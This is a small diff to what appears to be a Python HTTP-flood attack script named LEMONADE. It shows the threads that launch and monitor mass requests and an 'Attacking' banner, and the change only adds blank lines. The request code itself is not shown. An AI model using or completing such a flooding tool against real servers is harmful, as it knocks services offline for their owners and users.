@@ -228,6 +228,8 @@ class MonitorThread(threading.Thread):
             print(f"Summary All:{request_counter}/New Request:{request_counter - self.beforerequestcount}/Average new request:{round(allcount / len(self.newrequest))}")
             self.beforerequestcount = request_counter
 
+
+
 print(url)
 print(host)
 print("---------------LEMONADE started Attacking---------------")
@@ -235,6 +237,8 @@ MonitorThread().start()
 for i in range(thrd):
     httpcall().start()
 #print("Success fully started all threads")
+
+
 try:
     while True:
         #print(f"Summary Requested: {request_counter}")
